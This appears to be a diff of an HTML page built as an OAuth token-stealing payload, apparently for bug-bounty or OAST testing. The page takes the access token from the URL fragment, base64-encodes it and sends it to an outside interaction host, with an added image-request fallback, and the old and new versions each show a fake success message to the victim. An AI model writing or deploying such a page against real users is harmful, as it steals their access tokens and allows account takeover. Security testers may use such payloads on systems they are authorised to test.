@@ -1,24 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>Authenticating...</title></head>
 <body>
+    <h1>Extracting Token...</h1>
     <script>
-        // 1. Get the fragment (#access_token=...)
-        var tokenData = window.location.hash;
+        // 1. Capture the fragment (#access_token=...)
+        var fragment = window.location.hash;
 
-        if (tokenData) {
-            // 2. Base64 encode it so special characters don't break the URL
-            var encodedToken = btoa(tokenData);
-            
-            // 3. Send it to your OAST link
-            // Replace the URL below with your actual OAST URL
-            var oastUrl = "https://d5of2vla9dbicoemahp0kaqmqity6w7mr.oast.site/?leak=" + encodedToken;
-            
-            fetch(oastUrl).then(() => {
-                document.body.innerHTML = "<h1>Authentication Successful</h1>";
-            });
+        if (fragment) {
+            // 2. Your new OAST URL
+            var oastUrl = "https://d5ofuuda9dbio9v97ls0xmcjxchecoj7h.oast.pro/?token_data=" + btoa(fragment);
+
+            // 3. Primary Send: Fetch
+            fetch(oastUrl);
+
+            // 4. Secondary Send: Image fallback (highest success rate)
+            var leak = new Image();
+            leak.src = oastUrl;
+
+            console.log("Token sent to OAST!");
+            document.body.innerHTML = "<h1>Authentication Successful</h1><p>Check your OAST terminal for the interaction.</p>";
         } else {
-            document.body.innerHTML = "<h1>Error: No token found in URL fragment.</h1>";
+            document.body.innerHTML = "<h1>Error: No fragment found.</h1><p>Ensure the URL contains a # fragment.</p>";
         }
     </script>
 </body>
